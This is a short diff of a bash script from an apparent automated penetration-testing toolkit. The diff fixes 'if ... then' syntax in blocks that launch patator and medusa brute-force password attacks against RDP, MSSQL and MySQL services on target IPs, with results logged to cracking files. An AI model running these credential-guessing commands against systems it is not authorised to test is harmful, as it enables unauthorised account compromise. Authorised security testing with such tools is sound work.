@@ -135,8 +135,7 @@ if [ -f servicios/rdp.txt ]; then
 		
 		##############################
 
-		if [[ -z "$ENTIDAD" && "$ENTIDAD" != NULL ]]
-		then
+		if [[ -z "$ENTIDAD" && "$ENTIDAD" != NULL ]] ;then	
 			####### user $ENTIDAD ####
 			patator.py rdp_login --rate-limit=1 --threads=1 host=$ip user=$ENTIDAD password=FILE0 0=passwords.txt -x quit:egrep='OK|PASSWORD_EXPIRED'  2>> logs/cracking/"$ip"_"$ENTIDAD"-3389_passwordAdivinadoWin2.txt &		
 			##############################
@@ -163,7 +162,7 @@ then
 			echo -e "\n medusa -e n -u adm -P passwords.txt -h $ip -M mssql -f -t 1 "  >>  logs/cracking/"$ip"_1433_passwordBD.txt
 			medusa -e n -u adm -P passwords.txt -h $ip -M mssql -f -t 1 >>  logs/cracking/"$ip"_1433_passwordBD.txt 2>/dev/null &			
 
-			if [[ -z "$ENTIDAD" && "$ENTIDAD" != NULL ]]
+			if [[ -z "$ENTIDAD" && "$ENTIDAD" != NULL ]];then
 				echo -e "\n medusa -e n -u $ENTIDAD -P passwords.txt -h $ip -M mssql -f -t 1 "  >>  logs/cracking/"$ip"_mongo_passwordBD.txt
 				medusa -e n -u $ENTIDAD -P passwords.txt -h $ip -M mssql -f -t 1 >>  logs/cracking/"$ip"_mongo_passwordBD.txt
 			fi
@@ -232,7 +231,7 @@ then
 				echo -e "\n medusa -e n -u $admin_user -P passwords.txt -h $ip -M mysql -f -t 1 " >>  logs/cracking/"$ip"_3306_passwordBD.txt				
 				medusa -e n -u $admin_user -P passwords.txt -h $ip -M mysql -f -t 1  >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null &		
 				
-				if [[ -z "$ENTIDAD" && "$ENTIDAD" != NULL ]]
+				if [[ -z "$ENTIDAD" && "$ENTIDAD" != NULL ]];then
 					echo -e "\n medusa -e n -u $ENTIDAD  -P passwords.txt -h $ip -M mysql -f -t 1 " >>  logs/cracking/"$ip"_3306_passwordBD.txt				
 					medusa -e n -u $ENTIDAD  -P passwords.txt -h $ip -M mysql -f -t 1  >>  logs/cracking/"$ip"_3306_passwordBD.txt	&
 				fi
